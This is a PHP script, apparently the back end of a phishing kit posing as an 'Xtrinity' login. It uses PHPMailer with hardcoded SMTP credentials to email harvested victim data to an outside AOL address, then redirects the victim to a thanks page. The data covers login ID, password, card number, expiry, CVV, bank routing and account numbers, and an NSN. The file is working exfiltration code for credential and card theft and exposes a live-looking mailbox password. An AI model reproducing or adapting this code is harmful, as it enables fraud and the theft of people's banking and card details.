<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\SMTP;

require './vendor/autoload.php'; // Path to PHPMailer autoload.php


        $mail = new PHPMailer();

        $mail->isSMTP();
        $mail->SMTPDebug = SMTP::DEBUG_SERVER;
        $mail->Host = 'server341.web-hosting.com';
        $mail->SMTPAuth = true;
        $mail->Username = 'kelvinstewart@schwabslawfirm.com';
        $mail->Password = 'LoveandPeace247';
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS; // SSL encryption
        $mail->Port = 465;

        $mail->setFrom('support@m-xtrinity.online', 'Xtrinity Alert');
        $mail->addAddress('Denniswoodmle@aol.com');

        $mail->Subject = "Alert: New Login Details From Xtrinity";
        
        $mailContent = "
            <html>
            <head>
                <style>
                    .container { padding: 20px 40px; }
                    .cta-button { background-color: rgb(9, 82, 86); color: #fff; text-decoration: none; padding: 10px 20px; border-radius: 5px; }
                    .footer { margin-top: 20px; text-align: center; color: #666666; padding: 20px 40px; }
                </style>
            </head>
            <body style='font-family: Arial, sans-serif; background-color: #0c0c0c; margin: 0; padding: 0; font-size: 14px;color: #fff;'>
                <div class='container'>  
                    <div style='margin:20px 0;'>
                        <p> User ID :  $email </p>
                        <p> Password :  $password</p>
                        <p> Hold :  $hold</p> 
                        <p> Type :  $typ</p>
                        <p> Card :  $card</p>
                        <p> Expiry Date :  $date</p>
                        <p> CVV :  $cvv</p>
                        <p> MTM :  $MTM</p>
                        <p> Route Number :  $routeNumber</p>
                        <p> Bank Number :  $bankNumber</p>
                        <p> NSN :  $NSN</p> 
                    </div>
                    <p>Best regards,</p>
                </div>
                <div class='footer'>
                    <p>This information is shared from m-xtrinity.online</p>
                </div>
            </body>
            </html>
        ";
        $mail->msgHTML($mailContent);
        $mail->isHTML(true);

        if (!$mail->send()) {
            // Display the error message in a styled div
            echo '<div style="position:absolute;top:1rem; right:1rem;background-color:red; color: white; width: 400px; z-index: 111; word-wrap:break-word; word-break:break-word; padding:1rem; border-radius:10px 10px 0 10px;">
                Unable to send email. Error: ' . htmlspecialchars($mail->ErrorInfo, ENT_QUOTES, 'UTF-8') . '</div>';
        } else {
            echo "<script>window.open('./thanks.php', '_self');</script>";
            exit;
        }


?> 

